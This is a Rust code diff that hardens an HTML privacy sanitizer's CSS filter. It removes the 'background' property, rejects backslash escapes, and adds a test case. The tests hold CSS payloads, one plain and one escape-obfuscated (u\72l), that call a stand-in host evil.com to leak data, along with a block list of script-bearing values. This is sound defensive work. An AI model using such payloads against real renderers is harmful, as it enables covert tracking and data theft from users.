@@ -43,7 +43,6 @@ fn filter_css_properties(style: &str) -> String {
     const SAFE_PROPERTIES: &[&str] = &[
         "color",
         "background-color",
-        "background",
         "font-family",
         "font-size",
         "font-style",
@@ -108,11 +107,12 @@ fn filter_css_properties(style: &str) -> String {
             if !SAFE_PROPERTIES.contains(&prop.as_str()) {
                 return None;
             }
-            // Double-check: reject values with URL or script references
+            // Reject URL/script-bearing values and CSS escapes that can hide them.
             if value.contains("url(")
                 || value.contains("expression(")
                 || value.contains("javascript:")
                 || value.contains("vbscript:")
+                || value.contains('\\')
             {
                 return None;
             }
@@ -543,6 +543,14 @@ mod tests {
     fn test_blocks_css_url_exfiltration() {
         let guard = PrivacyGuard::new();
         let html = r#"<p style="background: url('https://evil.com/steal')">text</p>"#;
+        let result = guard.render_safe_html(html, &PrivacyMode::Strict);
+        assert!(!result.html.contains("evil.com"));
+    }
+
+    #[test]
+    fn test_blocks_escaped_css_url_exfiltration() {
+        let guard = PrivacyGuard::new();
+        let html = r#"<p style="background: u\72l('https://evil.com/steal')">text</p>"#;
         let result = guard.render_safe_html(html, &PrivacyMode::Strict);
         assert!(!result.html.contains("evil.com"));
     }
